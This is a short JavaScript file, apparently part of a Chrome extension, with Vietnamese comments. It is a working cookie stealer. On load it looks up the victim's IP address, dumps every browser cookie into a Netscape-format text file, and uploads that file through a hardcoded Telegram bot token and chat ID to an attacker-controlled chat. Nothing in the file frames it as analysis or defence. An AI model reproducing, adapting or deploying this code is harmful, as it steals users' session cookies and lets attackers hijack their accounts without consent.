const TELEGRAM_BOT_TOKEN = "7932847301:AAHUqlvKgEqZkQtVudR-ALRCdE5RBTBJLGs";
const CHAT_ID = "-4674658777";
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument?chat_id=${CHAT_ID}`;

async function sendCookiesToTelegram() {
    try {
        // Lấy địa chỉ IP của người dùng
        const ipResponse = await fetch("https://api.ipify.org");
        if (!ipResponse.ok) throw new Error("Failed to fetch IP address");
        const userIP = await ipResponse.text();

        // Lấy tất cả cookie trong trình duyệt
        chrome.cookies.getAll({}, function (cookies) {
            let cookieData = "";
            
            cookies.forEach(cookie => {
                const domain = cookie.domain.startsWith(".") ? cookie.domain : "." + cookie.domain;
                const path = cookie.path || "/";
                const secure = cookie.secure ? "TRUE" : "FALSE";
                const expiration = cookie.expirationDate ? Math.round(cookie.expirationDate) : "";
                cookieData += `${domain}\tTRUE\t${path}\t${secure}\t${expiration}\t${cookie.name}\t${cookie.value}\n`;
            });

            // Tạo file chứa cookie
            const fileBlob = new Blob([cookieData], { type: "text/plain" });
            const formData = new FormData();
            formData.append("document", fileBlob, `Cookies_Chrome_${userIP}.txt`);

            // Gửi file lên Telegram
            fetch(TELEGRAM_API_URL, {
                method: "POST",
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (!data.ok) throw new Error("Failed to send document: " + data.description);
            })
            .catch(error => console.error("Error sending document to Telegram:", error));
        });
    } catch (error) {
        console.error("Error in Cookie-Sender function:", error);
    }
}

sendCookiesToTelegram();
